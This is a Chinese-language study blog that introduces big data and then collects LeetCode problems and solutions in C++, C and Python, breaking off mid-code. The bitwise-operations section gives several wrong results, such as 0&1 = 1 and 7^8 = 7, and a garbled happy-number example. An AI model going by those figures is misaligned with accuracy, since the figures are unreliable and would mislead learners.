大数据（BigData）一词正式出现是在2011年麦肯锡全球研究院发布的《大数据：下一个创新、竞争和生产力的前沿》研究报告中。 
大数据的4个根本特征： 
1.Volume，数据量足够大 
2.Variety，数据的种类多样 
3.Velocity，数据的增长及处理速度快 
4.Value，数据蕴藏价值大
1.2 大数据的行业价值 
1.分析用户行为，建立数据模型，并进行预测 
WalMart将尿不湿和啤酒摆放在一起的销售策略。 
2.提升企业的资产管理，优化企业的业务流程 
UPS通过在货车上安装传感器，优化行车路线，2011年，其驾驶员少跑了将近4828万千米的路程。 
3.大数据服务智慧城市，智慧交通 
智能电表，升级智能电网，由原来的数据库架构升级为HBase，使用Hive进行相关的统计分析。 
4.变革公共医疗卫生，对疾病进行预测 
Google 的Flurend，百度的疾病预测 
5.在金融行业利用大数据进行战略决策和精准营销 
6.利用大数据保障公共安全 
7.利用大数据促进教育行业变革 
8.大数据在改善着每个人的生活
 
p.s. 






Write a function to find the longest common prefix string amongst an array of strings.
 

 
分析】
公共前缀指的是所有字符串的前缀都相同。显然，这个最长公共前缀的长度不会超过所有字符串中最短的那个。
我们先求得最短串长minLen，然后遍历所有字符串中的前minLen是否相等。
 
我的解决方案：
 
 

class Solution {
public:
    string longestCommonPrefix(vector<string>& strs)
    {
        
        if(strs.size() == 0) 
        return "";
        
        sort(strs.begin(),strs.end());
        int size = strs.size();
        int min_size = strs[0].length();
        string prefix = "";
        for(int i =0;i< min_size;++i)
        {
            char temp = strs[0][i];
            for(int j = 1;j<size;++j)
            {
                if(strs[j][i]!=temp)
                {
                    //break;
                    return prefix;
                }
                
            }
            prefix.append(1,temp); //= prefix +temp;//const char*的话怎么加进去呢？
        }
        
        return prefix;
    }
};
 
 
 
 
 
 
c++解决方案：

class Solution {
public:
    string longestCommonPrefix(vector<string>& strs) {
        if(strs.empty()) return "";
        std::sort(strs.begin(),strs.end());
        string ans=strs[0];
        for (int i = 0; i < strs.size(); ++i)       
            for (int j = 0; j < ans.length() ; ++j)
            {
                if(ans[j]!=strs[i][j]) { 
                    ans=ans.substr(0,j);
                    break;
                } 
            }
        return ans;

};

//But when I changed the first loop initial value "int i=1",it cost 8ms. As it is easy to proof the i=0 don't need to compare. //The loop less one time,but cost more than 4ms.



	string longestCommonPrefix(vector<string>& strs) {
    if(strs.size() == 0) 
        return "";

    string result;
    for(int i = 0; i<strs[0].length(); i++) {
        char c = strs[0][i];
        for(int j = 0; j<strs.size(); j++) {
            if(strs[j][i] != c)
                return result;
        }

        result += c;
    }

    return result;
}



//Divide-and-Conquer Approach, python, 44ms 
 



   
		
class Solution {
public:
    string longestCommonPrefix(vector<string>& strs) {
        if (strs.empty()) return "";
        for (int pos = 0; pos < strs[0].length(); pos++)
            for (int i = 1; i < strs.size(); i++)
                if (pos >= strs[i].length() || strs[i][pos] != strs[0][pos])
                    return strs[0].substr(0, pos);
        return strs[0];
    }
};


class Solution {
public:
    string longestCommonPrefix(vector<string> &strs) {
        int i, j, n = strs.size();
        if (n == 0) return "";
        sort(strs.begin() ,strs.begin() + n);
        for (j = 0; j < strs[0].size() && j < strs[n - 1].size() && strs[0][j] == strs[n - 1][j]; j++);
        return strs[0].substr(0, j);
    }
};




 
 
python解决方案：
 
 

class Solution:
    # @return a string
    def longestCommonPrefix(self, strs):
        if not strs:
            return ""

        for i, letter_group in enumerate(zip(*strs)):
            if len(set(letter_group)) > 1:
                return strs[0][:i]
        else:
            return min(strs)


def longestCommonPrefix(self, strs):
    prefix = '';
    # * is the unpacking operator, essential here
    for z in zip(*strs):
        bag = set(z);
        if len(bag) == 1:
            prefix += bag.pop();
        else:
            break;
    return prefix;


#Divide-and-Conquer Approach, python, 44ms 
 



class Solution:
    # @param {string[]} strs
    # @return {string}

    def longestCommonPrefix(self, strs):
        if not strs: return ""
        total = len(strs)
        l = min([len(x) for x in strs])
        g = 2
        while g / 2 < total:
            for i in xrange((total+g-1)/g):
                if i*g+g/2 < total:
                    while l and strs[i*g][:l] != strs[i*g+g/2][:l]: l-=1
            g *= 2
        return strs[0][:l]
 
 
 
 
 
﻿﻿ 








Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.  
• push(x) – Push element x onto stack.  
• pop() – Removes the element on top of the stack.  
• top() – Get the top element.  
• getMin() – Retrieve the minimum element in the stack. 
解决方案：
 
可以看到STL的解决方案跟大多数的c语言解决方案还是有差距的，后序我找一找基于链表的整齐点的c语言实现
The key idea is use a another stack to store the minimum value of the corresponding stack. Put differently, min[i] equals the minimum element where data[i] is the top of this sub-stack.
We can use a full size of min where it’s size equals the data’s, but it’s not necessary.
I have 2 main concerns about the algorithm:
1  
 We should pop the element in min IFF there’s match of data.top().
2  
 If we have multiple minima, for example [0, 1, 0] in data, then the min should be [0, 0].  
 Otherwise, the the pop operation wouldn’t work properly. 
 As a result, we should push the element if x <= min.top().
class MinStack {
public:
    void push(int x) {
        s.push(x);
        if (mins.empty() || x<=mins.top()) {
            mins.push(x);
        }
    }

    void pop() {
        int temp = s.top();
        s.pop();
        if (temp == mins.top()) {
            mins.pop();
        }
    }

    int top() {
        return s.top();
    }

    int getMin() {
        return mins.top();
    }

private:
    stack<int> s;
    stack<int> mins;
};

STL list实现：
class MinStack {
    private:
        list<int> s;
        int min;


    public:

        MinStack()
        {
            min=INT_MAX;
        }

        void push(int x) {
            if(x<min) min=x;
            s.push_back(x);

        }

        void pop() {
            if(s.back()==min)
            {
                s.pop_back();
                min=INT_MAX;
                list<int>::iterator it=s.begin();
                while(it!=s.end())
                {
                    if(*it<min) min=*it;
                    it++;
                }
            }else
                s.pop_back();
        }

        int top() {
            return s.back();
        }

        int getMin() {
            return min;
        }
    };

python解决方案：
class MinStack:
# @param x, an integer
def __init__(self):
    # the stack it self
    self.A = []
    self.minS=[]
# @return an integer
def push(self, x):
    n=len(self.A)
    if n==0:
        self.minS.append(x)
    else:
        lastmin=self.minS[-1]
        if x<=lastmin:
            self.minS.append(x)
    self.A.append(x)
# @return nothing
def pop(self):
    if len(self.A)>0 and self.A.pop()==self.minS[-1]:
        self.minS.pop()
# @return an integer
def top(self):
    return self.A[-1]


# @return an integer
def getMin(self):
    return self.minS[-1]

python解决方案2：

class MinStack:

def __init__(self):
    self.q = []

# @param x, an integer
# @return an integer
def push(self, x):
    curMin = self.getMin()
    if curMin == None or x < curMin:
        curMin = x
    self.q.append((x, curMin));

# @return nothing
def pop(self):
    self.q.pop()


# @return an integer
def top(self):
    if len(self.q) == 0:
        return None
    else:
        return self.q[len(self.q) - 1][0]


# @return an integer
def getMin(self):
    if len(self.q) == 0:
        return None
    else:
        return self.q[len(self.q) - 1][1]

  asked Apr 14  in Min Stack  by  charles8135 (180 points)    
 









Write a program to find the node at which the intersection of two singly linked lists begins.
For example, the following two linked lists:  
A:  —— a1 → a2 
———————- ↘ 
————————  c1 → c2 → c3 
———————–↗ 
B:     b1 → b2 → b3
begin to intersect at node c1.
Notes:  
•If the two linked lists have no intersection at all, return null. 
•The linked lists must retain their original structure after the function returns.  
•You may assume there are no cycles anywhere in the entire linked structure. 
•Your code should preferably run in O(n) time and use only O(1) memory.
 
非常优雅的解决方案：
ListNode *getIntersectionNode(ListNode *headA, ListNode *headB) 
{
    ListNode *p1 = headA;
    ListNode *p2 = headB;

    if (p1 == NULL || p2 == NULL) return NULL;

    while (p1 != NULL && p2 != NULL && p1 != p2) 
    {
        p1 = p1->next;
        p2 = p2->next;

        //
        // Any time they collide or reach end together without colliding 
        // then return any one of the pointers.
        //
        if (p1 == p2) return p1;

        //
        // If one of them reaches the end earlier then reuse it 
        // by moving it to the beginning of other list.
        // Once both of them go through reassigning, 
        // they will be equidistant from the collision point.
        //
        if (p1 == NULL) p1 = headB;
        if (p2 == NULL) p2 = headA;
    }

    return p1;
    //上面似乎不需要，上面的路径应该都有返回值，要不要都ac
}

python解决方案：
# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None

class Solution:
    # @param two ListNodes
    # @return the intersected ListNode
    def getIntersectionNode(self, headA, headB):
        curA,curB = headA,headB
        lenA,lenB = 0,0
        while curA is not None:
            lenA += 1
            curA = curA.next
        while curB is not None:
            lenB += 1
            curB = curB.next
        curA,curB = headA,headB
        if lenA > lenB:
            for i in range(lenA-lenB):
                curA = curA.next
        elif lenB > lenA:
            for i in range(lenB-lenA):
                curB = curB.next
        while curB != curA:
            curB = curB.next
            curA = curA.next
        return curA

/*
The solution is straightforward: maintaining two pointers in the lists under the constraint that both lists have the same number of nodes starting from the pointers. We need to calculate the length of each list though. So O(N) for time and O(1) for space.
*/
 









Compare two version numbers version1 and version2. 
 If version1 > version2 return 1, if version1 < version2 return -1, otherwise return 0.
You may assume that the version strings are non-empty and contain only digits and the . character. 
 The . character does not represent a decimal point and is used to separate number sequences. 
 For instance, 2.5 is not “two and a half” or “half way to version three”, it is the fifth second-level revision of the second first-level revision.
Here is an example of version numbers ordering: 
0.1 < 1.1 < 1.2 < 13.37
解决方案： 
The main idea is very simple and the code consists of three phases: 
1.When version1 and version2 are not finished, compare the value of corresponding string before dot. 
2.If version1 is finished, check whether remaining version2 contains string not equal to 0 
3.If version2 is finished, check whether remaining version1 contains string not equal to 0
Example1: version1==”11.22.33”, version2==”11.22.22”. 11 == 11; 22 == 22; 33 > 22; return 1.
Example2: version1==”11.22.33”, version2==”11.22.33”. 11 == 11; 22 == 22; 33 == 33; return 0.
Example3: version1==”11.22.33”, version2==”11.22.33.00.00”. 11 == 11; 22 == 22; 33 == 33; remaining version2 equals to 0; return 0.
Example4: version1==”11.22.33.00.01”, version2==”11.22.33”. 11 == 11; 22 == 22; 33 == 33; remaining version1 contains 01; return 1.

class Solution {
public:
    int compareVersion(string version1, string version2)
    {
        int i = 0;
        int j = 0;
        int n1 = version1.size();
        int n2 = version2.size();

        int num1 = 0;
        int num2 = 0;

        while(i < n1 || j < n2)
        { 
            while(i<n1 && version1[i]!='.')
            {
                num1 = num1*10 + (version1[i]-'0');
                i++;
            }

            while(j<n2 && version2[j]!='.')
            {
                num2 = num2*10 + (version2[j]-'0');
                j++;
            }

            if(num1>num2) return 1;

            else if(num1<num2) return -1;

            num1 = 0;
            num2 = 0;

            i++;
            j++;

        }
        return 0;

    }
};
python解决方案：
class Solution:
    # @param a, a string
    # @param b, a string
    # @return a boolean
    def compareVersion(self, version1, version2):
        v1 = version1.split('.')
        v2 = version2.split('.')
        for i in range(max(len(v1), len(v2))):
            gap = (int(v1[i]) if i < len(v1) else 0) - (int(v2[i]) if i < len(v2) else 0)
            if gap != 0:
                return 1 if gap > 0 else -1
        return 0
 









Given an array of size n, find the majority element. The majority element is the element that appears more than ⌊ n/2 ⌋ times.
You may assume that the array is non-empty and the majority element always exist in the array.
思路：
Find k different element, and “remove” them as a group, the remaining element must be the element that appears more than ⌊n/k⌋ times. (Detailed explanation is given in comment)
In this problem, k equals to 2.
Thus we “remove” each pair of 2 different elements, and the remaining element that do not have its counterpart is the desired element.  
时间复杂度O(n)空间复杂度O(1)的算法呢? 实际上，早在91年就有人专门就这个问题发表了论文，介绍了一种线性时间的算法: Majority Vote Algorithm。通过名字就可以看出，这个算法是专门用来解决这个问题的。而由于作者是J Moore (目前是Utexas的计算机系主任)，这个算法有时候也会被称为Moore’s Voting Algorithm (当然这个Moore并不是提出Moore’s Law的那个Gordon Moore)。
算法的基本思想非常简洁: 每次都找出一对不同的元素，从数组中删掉，直到数组为空或只有一种元素。 不难证明，如果存在元素e出现频率超过半数，那么数组中最后剩下的就只有e。当然，最后剩下的元素也可能并没有出现半数以上。比如说数组是[1, 2, 3]，最后剩下的3显然只出现了1次，并不到半数。排除这种false positive情况的方法也很简单，只要保存下原始数组，最后扫描一遍验证一下就可以了。
现在来分析一下复杂度。删除元素可以在常数时间内完成，但找不同元素似乎有点麻烦。实际上，我们可以换个角度来想，用一个小trick来重新实现下该算法。
在算法执行过程中，我们使用常量空间实时记录一个候选元素c以及其出现次数f(c)，c即为当前阶段出现次数超过半数的元素。在遍历开始之前，该元素c为空，f(c)=0。然后在遍历数组A时，
如果f(c)为0，表示当前并没有候选元素，也就是说之前的遍历过程中并没有找到超过半数的元素。那么，如果超过半数的元素c存在，那么c在剩下的子数组中，出现次数也一定超过半数。因此我们可以将原始问题转化为它的子问题。此时c赋值为当前元素, 同时f(c)=1。
如果当前元素A[i] == c, 那么f(c) += 1。(没有找到不同元素，只需要把相同元素累计起来)
如果当前元素A[i] != c，那么f(c) -= 1 (相当于删除1个c)，不对A[i]做任何处理(相当于删除A[i])

如果遍历结束之后，f(c)不为0，那么再次遍历一遍数组，记录c真正出现的频率，从而验证c是否真的出现了超过半数。上述算法的时间复杂度为O(n)，而由于并不需要真的删除数组元素，我们也并不需要额外的空间来保存原始数组，空间复杂度为O(1)。实际上，在Moore大牛的主页上有针对这个算法的一个演示，感兴趣的同学可以直接移步观看。
这个问题看上去已经完美的解决了。
二、更一般的情况呢？
那么，如果我们想找的并不是超过半数的元素，而是出现频率超过一定频率的元素都要找出来，是否也存在一个类似的线性时间的算法呢?答案是肯定的。实际上，这一类从特定的数据集中找出出现频率超过某个阈值的元素的问题，有一个形象的名字叫做Iceberg query，或者叫做host list分析。而Richard Karp 老爷子当年就专门写了一篇论文来讨论这种一般性问题的解决方案，而通过下文的介绍，大家也可以发现，Karp的方案应该也是受到了Moore的算法的启发。
首先还是看一下问题的形式化定义吧:
对于一个序列 以及一个在(0,1)之间的实数。假定表示元素的出现频率，我们需要找到所有满足的元素。
原帖连接： 
https://leetcode.com/discuss/19151/solution-computation-space-problem-can-extended-situation
http://m.blog.csdn.net/blog/wenyusuran/40780253
解决方案：
class Solution {
public:
    int majorityElement(vector<int>& nums)
    {
        int size = nums.size();
        int vote = 0;
        int count = 0;

        for(int i = 0;i < size;i++)
        {
            if(count == 0)
            {
                vote = nums[i];
                count = 1;
            }
            else
            {
                if(vote == nums[i])
                count++;
                else
                count--;
            }
        }
        return vote;
    }
};
STL解决方案：
int majorityElement(vector<int> &num)
 {
        map<int, int>count;
        for (vector<int>::iterator i = num.begin(); i != num.end();i++) 
        {
            if ( (++count[*i]) > num.size() / 2)
                return *i;

        }
    }

c语言：
int majorityElement(int num[], int n)
 {
    int cnt = 0, res;
    for (int i = 0; i < n; ++i) 
    {
        if (cnt == 0) res = num[i];
        if (res == num[i]) ++cnt;
        else --cnt;
    }
    return res;
}







python解决方案：
class Solution:
        # @param {integer[]} nums
        # @return {integer}
        def majorityElement(self, nums):
            count = {}
            for i in nums:
                if i not in count:
                    count[i] = 0
                count[i] += 1
                if count[i] > len(nums)/2:
                    return i
 









Given an integer n, return the number of trailing zeroes in n!.
Note: Your solution should be in logarithmic time complexity.
解决思路： 
决定阶乘末尾零的个数其实是数列中5出现的次数，比如5的阶乘一个零。1024的阶乘末尾到底有几个零呢？
http://bbs.csdn.net/topics/380161955
 
代码如下：
int trailingZeroes(int n) 
{
    int total = 0;

    while(n>=5)
    {
        n = (n-(n%5))/5;
        total = total + n;
    }

    return total;

}
python 的解决方案：
class Solution:
    # @return an integer
    def trailingZeroes(self, n):
        factor, count = 5, 0

        while True:
            curCount = n // factor
            if not curCount:
                break

            count += curCount
            factor *= 5

        return count
 









Rotate an array of n elements to the right by k steps.
For example, with n = 7 and k = 3, the array [1,2,3,4,5,6,7] is rotated to [5,6,7,1,2,3,4]. 
Note: 
 Try to come up as many solutions as you can, there are at least 3 different ways to solve this problem. 
思想： 
1.—567旋转—765 
2.—1234旋转—4321 
3.—整体旋转4321765—5671234
解决方案：
void reverse(int left,int right,int *array)
{
    int temp = 0;
    while(left<right)
    {

        temp = array[left];
        array[left]= array[right];
        array[right] = temp;
        left++;
        right--;
    }
}

void rotate(int* nums, int numsSize, int k)
{
    k = k%numsSize;//不知道为何这里要加上这一句？
    reverse(0,numsSize-k-1,nums);
    reverse(numsSize-k,numsSize-1,nums);
    reverse(0,numsSize-1,nums);
}

python解决方案：
class Solution:
# @param nums, a list of integer
# @param k, num of steps
# @return nothing, please modify the nums list in-place.
def rotate(self, nums, k):
    if not nums:
        return
    k%=len(nums)
    nums.reverse()
    self.reverse(nums,0,k-1)
    self.reverse(nums,k,len(nums)-1)


def reverse(self,nums,start,end):
    while start<end:
        nums[start],nums[end]=nums[end],nums[start]
        start+=1
        end-=1
 









Reverse bits of a given 32 bits unsigned integer.
For example, given input 43261596 (represented in binary as 00000010100101000001111010011100), return 964176192 (represented in binary as 00111001011110000010100101000000).
Follow up: 
 If this function is called many times, how would you optimize it? 
解决方案： 
Basically, this code is just keeping pop the last bit from n and push it to the end of the return result.
Do 
•Get last bit from n 
•Push the bit to the end of the result 
•Pop out the last bit of n
Until n is 0 
•Push remaining 0s to the n by “ret << nShift”
•Return the result “ret”
 uint32_t ret = 0;

    int nShift = 32;
    while (n && nShift--)
    {
        // shift ret to left by one and move a room for the new push
        ret = (ret << 1);
        // Push the last bit of the n to ret
        if (n%2)
            ret |= 0x1;
        // pop the last element out
        n = (n>>1);
    }

    return ret << nShift; 

位操作详解
参考：http://www.crazycpp.com/?p=82
我们先来看看位运算操作符：& (按位与)、| (按位或)、^ (按位异或)、~ (按位取反)、>> (按位右移)、<< (按位左移)。
1、&（按位与） 从概念上来讲，就是将参与运算的两个分量对应的每一位来做逻辑与运算，若两者都为真（等于1），则结果才为真（等于1）。否则都为假（等于0）。 
 即：1 & 1 = 1 、1&0 = 0 、0&1 = 1、0&0 = 0 
这里我们先来看看那一个8位二进制的例子： 
7&8 = 0000 0111 & 0000 1000 = 0000 0000 = 0 
 7&6 = 0000 0111 & 0000 0110 = 0000 0110 = 6
2、| (按位或) 即把参与运算的每个分量对应的每一位来做逻辑或运算，即两者都为假（为0）时，才为假（为0），否则皆为真。 
 即：0|0 = 0、1|0 = 1、0|1 = 1、1|1 = 1 
来看看8位二进制的例子： 
7|8 = 0000 0111 | 0000 1000 = 0000 1111 = 15 
 7|6 = 0000 0111 | 0000 0110 = 0000 0111 = 7
3、^(按位异或) 即把参与运算的每个分量对应的每一位来做异或运算，即两者相同为假，不同为真。 
 即：0|0 = 0、 1|0 = 1、0|1 = 1、 1|1 = 0 
看下面的例子: 
7^8 = 0000 0111 ^ 0000 1000 = 0000 0111 = 7 
 7^6 = 0000 0111 ^ 0000 0100 = 0000 0011 = 3
4、~（按位取反） 即把二进制位的每一位进行取反运算，简而言之就是1变成0，0变成1。 
 直接看例子： 
~7 = ~0000 0111 = 1111 1000 = 248
5 >>（按位右移）把二进制位整体向右移动。 
7>>1 = 0000 0111 >> 1 = 0000 0011 = 3 
 7>>2 = 0000 0111 >> 2 = 0000 0001 = 1 
这里右移等于除了2的N次方，N为右移的位数。
6 <<（按位左移）这里就不详细说了，和右移相反。
位操作应用
好了，下面讲讲实际应用吧。 
 一、一种颜色的表示方式—- 通过DWORD来表示颜色 
 定义：typedef unsigned long DWORD; 
即为一个无符号32位（32机器）长整数，有四个字节，我们从左到右叫他1，2，3，4字节，每一个字节的范围是0～255。第一个字节表示alpha值，即透明度。如果是255，表示不透明，0表示完全透明（
看不到），其他分别是R,G,B值。 
 可通过下列方法获得每个字节的值： 
int A = (int)((DWORD & 0xFF000000) >> 24); 
 int R = (int)((DWORD & 0x00FF0000) >> 16); 
 int G = (int)((DWORD & 0x0000FF00) >> 8); 
 int B = (int)(DWORD & 0x000000FF);
DWORD dwColor = (A<<24)+(R<<16)+(G<<8)+B; 
有了前面的基础，我相信大家对上面的换算方法，一看就明白吧。如果对16进制不敏感的童鞋，可以用计算机把十六进制换算成二进制，更容易理解。
二、状态系统中的使用
在游戏开发中，我们通常用一个32位（假设这里用32位）的整数来存储角色的状态(这样做主要是为了节约存储空间，同时也减小网络同步消息包的size)。所谓的状态，就是大家熟悉的Buff或者DeBuff。 
enum ROLE_STATUS 
 { 
 STATUS_NORMAL = 0, // 正常 
STATUS_DIE = 1, // 死亡状态 
STATUS_GOD , // 无敌 
STATUS_DISAPPEARING , // 消失中状态 
STATUS_DEF_ADJUST , // 物理防御提升/降低 
STATUS_MDEF_ADJUST , // 魔法防御提升/降低 
STATUS_ATK_CRI_ADJUST , // 同时提升物理攻击和爆击率 
STATUS_MAXHP_ADJUST , // HP上限调整 
STATUS_MAXMP_ADJUST , // MP上限提升/降低 
//…… 
这里最多只能写32个，因为我们假设是用32位数据来存储状态。 
};
状态数据定义好了，现在来看看怎么使用他们。 
 首先， 角色上线，我要给他一个保护状态，应该这样操作。 
DWORD dwRoleStatus = STATUS_GOD; 
同时，角色使用了一个物品，这个物品的效果时，HP和MP上限增加一段时间。因此要附加调整玩家的HP和MP上限的状态，应该这样。 
DWORD dwRoleStatus |= (STATUS_MAXHP_ADJUST+STATUS_MAXMP_ADJUST); 
这里是|=而不是=操作，因为不能清掉之前附加的无敌保护状态。所以用或运算。 
 该角色受到其他玩家或者怪物的攻击，我们要判断被攻击的这个角色的受保护状态状态还在不在。执行如下逻辑 
if( dwRoleStatus & STATUS_GOD ) // 判断位是否为1 
 { 
 // 受保护状态，不能被攻击 
}
接下来，角色无敌保护时间过期了，我们要清除无敌状态，执行如下操作 
dwRoleStatus &= ~STATUS_GOD; 
这里用到了取反的计算。~STATUS_GOD的结果是第二位为0外，其他都为1。然后和dwRoleStatus做按位与计算。 
STATUS_GOD 等于 0000 0000 0000 0000 0000 0000 0000 0000 0000 0010; 
 ~STATUS_GOD 等于 1111 1111 1111 1111 1111 1111 1111 1111 1111 1101; 
因此和dwRoleStatus相与之后，dwRoleStatus除了第二位以外的位，都保留下来了。第二位不管是什么值，都会被设置为0,这样子就把STATUS_GOD这个状态清除掉了。同理我们要清除多个状态的时候，先把要清楚的状态或运算到一起。再取反，然后和dwRoleStatus按位与。起到同时清除多个状态。
然后讲讲异或，它有一个性质是，两次异或，能还原回来
例如 a=7,b=6;
a = a^b^b
我们来看看那二进制的操作
a = 0111
b = 0110
c = a^b = 0001
a = c^b = 0111
写到这里，想到一道经典的C++笔试题，即不需要第3个变量，交换两个变量的值。
a = a^b = 0001
b = b^a = 0111
a = a^b = 0110 









今天看了一个华为西安研究院的一个女生代码大神的总结很有感悟，下面这句话送给大家：
只有好的程序员才能写出人类可以理解的代码
You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security system connected and it will automatically contact the police if two adjacent houses were broken into on the same night.
Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight without alerting the police.
the objective function is basically:
dp(i) = max(dp[i-2] + num[i], dp[i-1]), 
this means the current max is the max of the position i-2 plus the current num[i], or the max of the previous one i-1 (cannot including num[i] with i-1 position, otherwise it will trigger the alarm)
我的解决方案： 

class Solution {
public:
    int rob(vector<int>& nums)
    {
        if(nums.empty())return 0;

        int length = nums.size();
        vector<int> dp(length,0);

        dp[0] = nums[0];
        dp[1] = max(nums[0],nums[1]);

        for(int i =2; i< length; ++i)
        {
            dp[i] = max(dp[i-2]+nums[i],dp[i-1]);
        }

        return dp[length-1];

    }
};
c语言解决方案：
#define max(a, b) ((a)>(b)?(a):(b))
int rob(int num[], int n) {
    int a = 0;
    int b = 0;

    for (int i=0; i<n; i++)
    {
        if (i%2==0)
        {
            a = max(a+num[i], b);
        }
        else
        {
            b = max(a, b+num[i]);
        }
    }

    return max(a, b);
}

python解决方案：
class Solution:
    # @param num, a list of integer
    # @return an integer
    def rob(self, num):
        # DP O(n) time, O(1) space
        # ik: max include house k
        # ek: max exclude house k, (Note: ek is also the maximum for house 1,...,k-1)
        # i[k+1]: num[k] + ek #can't include house k
        # e[k+1]: max(ik, ek) # can either include house k or exclude house k
        i, e = 0, 0
        for n in num: #from k-1 to k
            i, e = n+e, max(i,e)
        return max(i,e)
 









Given a linked list, remove the nth node from the end of list and return its head.
For example, 
   Given linked list: 1->2->3->4->5, and n = 2.
After removing the second node from the end, the linked list becomes 1->2->3->5.
Note: 
 Given n will always be valid. 
 Try to do this in one pass. 
解决方案：
Because the linked list have no knowledge about the previous nodes, we have to provide such information.
The difference between the final node and the to-be-delete node is N, hence we can utilize this information. 
•front pointer points to the node which is N step away from the to-be-delete node 
•rear pointer points to the to-be-delete node.
The algorithms is described as below: 
•First driving front pointer N step forward. 
•Secondly, move the 2 pointers 1 step ahead till the front pointer reach the end simultaneously, which will cause the rear pointer points to the previous node of the to-be-delete node. 
• 
Finally, jump the rear->next node by rear->next = rear->next->next.
下面的代码稍微有一个疑问：
http://bbs.csdn.net/topics/391029228
class Solution {
public:
    ListNode *removeNthFromEnd(ListNode *head, int n) {

        ListNode new_head(-1);
        new_head.next = head;

        ListNode *front = &new_head, *rear = &new_head;

        for (int i = 0; i < n; i++)
            front = front->next;

        while (front->next != NULL) {
            front = front->next;
            rear = rear->next;
        }

        ListNode *tmp = rear->next;
        rear->next = rear->next->next;
        delete tmp;

        head = new_head.next;

        return head;
    }
};

python解决方案：
# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None

class Solution:
    # @param {ListNode} head
    # @param {integer} n
    # @return {ListNode}
    def removeNthFromEnd(self, head, n):
        dummyHead = ListNode(0)
        dummyHead.next = head
        slow = fast = dummyHead

        for i in range(n):
            fast = fast.next

        while fast and fast.next:
            fast = fast.next
            slow = slow.next

        slow.next = slow.next.next

        return dummyHead.next
 






 
Write an algorithm to determine if a number is "happy".
A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a
 cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.
Example: 19 is a happy number
12 + 92 = 8282 + 22 = 6862 + 82 = 10012 + 02 + 02 = 1我的解决方案：


// happy number.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <set>
using namespace std;


  bool isHappy(int n)
    {
        int split = 0;
        int sum = 0;
        
        set<int> myset;
        set<int>::iterator it;
        
        while(sum != 1)
        {
            do
            {
                split = n % 10;
                n = n / 10;
                sum = split* split + sum;
            }
			while(n>0);
                
            if(sum==1)
            {
                break;
            }
            else
            {
                    
                it=myset.find(sum);
				if(it!=myset.end())
                {
                    return false;
                }
                myset.insert(sum);
				n = sum;
				sum = 0;

            }

        }
        
        return true;
    }
int _tmain(int argc, _TCHAR* argv[])
{

	isHappy(19);
	return 0;
}







最短的一个代码，用了些数论的知识吧：
https://leetcode.com/discuss/33014/4ms-5-line-c-code

bool isHappy(int n) {
    while(n>6){
        int next = 0;
        while(n){next+=(n%10)*(n%10); n/=10;}
        n = next;
    }
    return n==1;
}



两个python代码：


﻿﻿
 def isHappy(self, n):
    return self.isHappyHelper(n, {})

def isHappyHelper(self, n, prev):
    if n == 1:
        return True
    elif n not in prev:
        prev[n] = 1
    else:
        return False

    new = 0
    for char in str(n):
        new += int(char)**2

    return self.isHappyHelper(new, prev)


class Solution:
# @param {integer} n
# @return {boolean}
def isHappy(self, n):
    table = []
    n = self.convert(n)
    while n != 1:
        if n in table:
            return False
        else:
            table.append(n)
            n = self.convert(n)
    return True

# @param {integer} n
# @return {integer} sum of digits
def convert(self, n):
    res = 0
    while n > 0:
        temp = n % 10
        res += temp * temp
        n = n // 10
    return res



﻿﻿






﻿﻿
Remove all elements from a linked list of integers that have valueval.
ExampleGiven: 1 --> 2 --> 6 --> 3 --> 4 --> 5 --> 6, val = 6Return: 1 --> 2 --> 3 --> 4 --> 5 


我的解法：




// Linklist.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"


#include<iostream>
using namespace std;


  struct ListNode
  {
      int val;
      ListNode *next;
      ListNode(int x) : val(x), next(NULL) {}
  };
 


    ListNode* removeElements(ListNode* head, int val) 
    {
        if(head == NULL)return head;
        
        ListNode* pre = NULL;
        ListNode* root = head;
        ListNode* current = head;
        
        
        while(current!=NULL)
        {
            
            if(current->val == val)
            {
                if(pre==NULL)
                {
					current = current->next;
                    root = current;
                    

                }
                else
                {
                    pre->next = current->next;
                    current = current->next;
                    
                }
                
               
            }
            else
            {
                pre = current;
                current =current->next;
                
                
            }
        }
        
        return root;
    }

int _tmain(int argc, _TCHAR* argv[])
{
	ListNode* temp = new ListNode(2);
	ListNode* temp_next = new ListNode(1);
	temp->next = temp_next;
	removeElements(temp,1);
	return 0;
}





python的解法：

class Solution:
    # @param {ListNode} head
    # @param {integer} val
    # @return {ListNode}
    def removeElements(self, head, val):
        dummy = ListNode(-1)
        dummy.next = head

        prev = dummy
        while head:
            if head.val == val:
                prev.next = head.next
                head = prev
            prev = head
            head = head.next
        return dummy.next




一个非常简洁的解法：

struct ListNode* removeElements(struct ListNode* head, int val) 
{
    if (head&&head->val==val)head=removeElements(head->next, val);
    if (head&&head->next)head->next=removeElements(head->next, val);
    return head;
}









    

Description:

Count the number of prime numbers less than a non-negative number, n
 
提示晒数法：
http://en.wikipedia.org/wiki/Sieve_of_Eratosthenes
https://primes.utm.edu/howmany.html
 
别人的代码：
 
int countPrimes(int n) {
    if (n<=2) return 0;
    vector<bool> passed(n, false);
    int sum = 1;
    int upper = sqrt(n);
    for (int i=3; i<n; i+=2) {
        if (!passed[i]) {
            sum++;
            //avoid overflow
            if (i>upper) continue;
            for (int j=i*i; j<n; j+=i) {
                passed[j] = true;
            }
        }
    }
    return sum;
}

 
 
 
我的代码：
 
// countprime.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <iostream>
#include <math.h>
#include<vector>
using namespace std;

int countPrimes1(int n) 
{
	int temp = 0;
	if (2 >= n) return 0;

	bool* primes = new bool[n];
	for (int i = 2; i < n; ++i)
		primes[i] = true;

	int sqr = (int)(sqrt((double)(n - 1)));
	for (int i = 2; i <= sqr; ++i)
	{
		if (primes[i])
		{
			temp++;
			for (int j = i * i; j < n; j += i)
				primes[j] = false;
		}
	}

	int sum = 0;
